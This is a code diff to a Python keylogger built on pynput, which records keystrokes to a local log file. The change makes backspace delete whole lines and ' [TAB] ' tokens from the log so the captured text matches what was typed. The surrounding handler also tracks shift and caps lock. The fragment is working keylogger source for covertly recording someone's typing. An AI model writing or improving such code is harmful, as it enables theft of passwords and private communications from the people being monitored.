@@ -41,9 +41,24 @@ def keyPressed(key):
         elif key == keyboard.Key.backspace:
             with open("logfile.txt", 'r+') as logKey:
                 content = logKey.read()
-                logKey.seek(0)
-                logKey.truncate()
-                logKey.write(content[:-1])
+                if content != '':
+                    logKey.seek(0)
+                    logKeyLength = len(content)
+                    a = content[-1:logKeyLength]
+                    if logKeyLength >= 2 and content[-1:logKeyLength] == "\n":
+                        content = content[:-2]
+                        while content[-1:logKeyLength] != '\n':
+                            content = content[:-1]
+                        content = content[:-1]
+                        logKey.truncate()
+                        logKey.write(content)
+                    elif logKeyLength >= 7 and content[-7:logKeyLength] == " [TAB] ":
+                        a = content[:-7]
+                        logKey.truncate()
+                        logKey.write(content[:-7])
+                    else:
+                        logKey.truncate()
+                        logKey.write(content[:-1])
         elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
             shift_pressed = True
         elif key == keyboard.Key.caps_lock:
